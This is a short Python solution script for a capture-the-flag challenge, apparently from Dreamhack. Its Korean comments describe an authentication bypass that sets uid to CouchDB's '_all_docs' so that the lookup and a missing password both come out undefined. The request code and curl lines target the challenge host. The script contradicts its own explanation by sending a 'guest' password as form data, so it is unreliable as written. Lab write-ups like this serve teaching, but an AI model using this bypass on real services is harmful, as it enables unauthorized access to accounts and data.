'''
solution..!
- /auth 에서 파라미터 값에 대한 어떠한 검사도 하지 않고 있음
- _all_docs 페이지에 접근해 데이터베이스의 정보를 획득하거나 어플리케이션의 조건문을 만족하고 인증을 우회할 수 있음
- application 조건문에서 result와 form upw가 동일해야 flag 값을 리턴함
- upw값을 안주면 undefined로 되고, uid에 _all_docs를 줬을때 리턴되는 값도 undefined이므로 일치함
'''
import requests
import json
from urllib import parse

#s = requests.Session()
url = "http://host3.dreamhack.games:24451/auth"
headers = {'Content-Type': 'application/json;'}
data = {'uid' : '_all_docs', 'upw' : 'guest'}
res = requests.post(url, headers=headers, data=data)
print(res.text)


# curl -X POST http://host3.dreamhack.games:24451/auth -H "Content-Type: application/json" -d '{"uid": "_all_docs", "upw": "guest"}'
# curl -X POST http://host3.dreamhack.games:24451/auth -H "Content-Type: application/json" -d '{"uid": "_all_docs"}'